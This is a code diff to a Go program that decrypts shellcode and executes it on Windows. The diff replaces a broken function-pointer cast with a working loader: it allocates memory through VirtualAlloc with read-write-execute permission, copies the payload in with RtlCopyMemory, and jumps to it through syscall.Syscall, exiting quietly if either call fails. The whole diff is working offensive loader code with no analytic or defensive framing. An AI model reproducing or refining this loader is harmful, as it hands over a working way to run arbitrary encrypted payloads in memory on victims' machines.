@@ -5,7 +5,22 @@ import (
 	"crypto/cipher"
 	"log"
 	"os"
+	"syscall"
 	"unsafe"
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+	kernel32 = syscall.MustLoadDLL("kernel32.dll")
+	ntdll    = syscall.MustLoadDLL("ntdll.dll")
+
+	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
 func main() {
@@ -58,14 +73,26 @@ func decrypt(key, ciphertext []byte) ([]byte, error) {
 }
 
 func executeShellcode(shellcode []byte) error {
-	// Convert shellcode to a function pointer and execute it
-	shellcodeFunc := func() {
-		// Cast shellcode to a function pointer and execute it
-		shellcodePtr := unsafe.Pointer(&shellcode[0])
-		fn := *(*func())(shellcodePtr)
-		fn()
-	}
-	shellcodeFunc()
+	addr, _, err := VirtualAlloc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
+	}
+
+	_, _, err = RtlCopyMemory.Call(
+		addr,
+		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+	)
+
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
+	}
+
+	// jump to shellcode
+	syscall.Syscall(addr, 0, 0, 0)
 	return nil
 }
